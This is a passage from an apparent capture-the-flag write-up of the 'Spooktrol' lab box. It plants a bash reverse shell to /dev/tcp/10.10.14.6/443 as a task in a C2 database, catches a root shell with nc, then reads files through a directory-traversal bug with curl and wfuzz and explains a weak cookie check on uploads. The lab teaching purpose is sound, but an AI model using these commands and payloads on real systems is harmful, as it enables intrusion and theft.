INSERT INTO tasks VALUES(4,'17a831078f79c7c80a2dade8bd2edf50',0,1,'whoami','','');
CREATE INDEX ix_tasks_id ON tasks (id);
COMMIT

```

Now I’ll just add my own:

```

sqlite> INSERT INTO tasks VALUES(5,'10a6dd5dde6094059db4d23d7710ae12',0,1,'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"','','');

```

I gave it id 5, since 4 was the last used. The session is the one on spookytrol. The status is 0 for incomplete. The type is 1, for execution, and the command is a reverse shell.

After a minute or so, at a waiting `nc`:

```

oxdf@parrot$ nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.123.
Ncat: Connection from 10.10.11.123:58172.
bash: cannot set terminal process group (16277): Inappropriate ioctl for device
bash: no job control in this shell
root@spooktrol:~# 

```

Terminal upgrade:

```

root@spooktrol:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@spooktrol:~# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@spooktrol:~# 

```

And grab `root.txt`:

```

root@spooktrol:~# cat root.txt
92a2a92d************************

```

## Beyond Root - Directory Traversal

The `/file_management/` endpoint has a directory traversal bug in it. Knowing what the box looks like, I can actually just read `/root/user.txt`:

```

oxdf@parrot$ curl http://10.10.11.123/file_management/?file=../../../../root/user.txt
d197bc88************************

```

That would be hard to guess in a live competition.

Still, I can fuzz for Python files in the same and parent directories with `wfuzz`. I didn’t find anything in the current directory, but going up one:

```

oxdf@parrot$ wfuzz -u http://10.10.11.123/file_management/?file=../FUZZ.py -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 21
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.123/file_management/?file=../FUZZ.py
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000212:   200        4 L      10 W     115 Ch      "server"

Total time: 13.24183
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 195.4412

```

The file loads the app:

```

oxdf@parrot$ curl http://10.10.11.123/file_management/?file=../server.py 
import uvicorn

if __name__ == "__main__":
    uvicorn.run("app.main:app", host="0.0.0.0", port=8000, reload=True)

```

`app.main:app` says it is going into a directory named `app`, loading `main.py`, and then calling the `app` function.

I can leak the full source:

```

oxdf@parrot$ curl http://10.10.11.123/file_management/?file=../app/main.py                           
from typing import Optional
from fastapi import File, UploadFile, Request 
from fastapi import FastAPI    
from fastapi.encoders import jsonable_encoder
from fastapi.responses import FileResponse, JSONResponse, PlainTextResponse
from random import randrange                        
import os, subprocess
import json
import uvicorn               
import app.database           
from urllib.parse import parse_qs
import app.models                 

from .database import SessionLocal, engine
from . import models, crud
                                                                    
app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)
models.Base.metadata.create_all(bind=engine)

@app.get("/")            
def get_root(request: Request, hostname = "") -> dict:
...[snip]...

```

This gives an alternative way to look at the upload path:

```

@app.put("/file_upload/")                 
async def file_upload(request: Request, file: UploadFile = File(...)):                                                                  
    auth = request.headers.get("Cookie")[5:]                        
    # We are divisible by 42                                  
    if int(auth, 16) % 42 != 0:             
        return JSONResponse(status_code=500, content={'message': 'Internal Server Error'})                                              
    try:                                                            
        os.mkdir("files")
        print(os.getcwd())                            
    except Exception as e:
        print(e)                                                                                                                        
    file_name = os.getcwd() + "/files/" + file.filename.replace(" ", "-")                                                               
    try:                           
        with open(file_name,'wb+') as f:        
            f.write(file.file.read())
            f.close()                           
    except:                                                 
        return JSONResponse(status_code=500, content={'message': 'Internal Server Error'})
    return JSONResponse(status_code=200, content={'message': 'File upload successful /file_management/?file=' + file.filename.replace(" ", "-") })  

```

The auth check is just making sure that the cookie is divisible by 42! That’s enough information to skip the Burp redirection and create a PUT request that uploads files.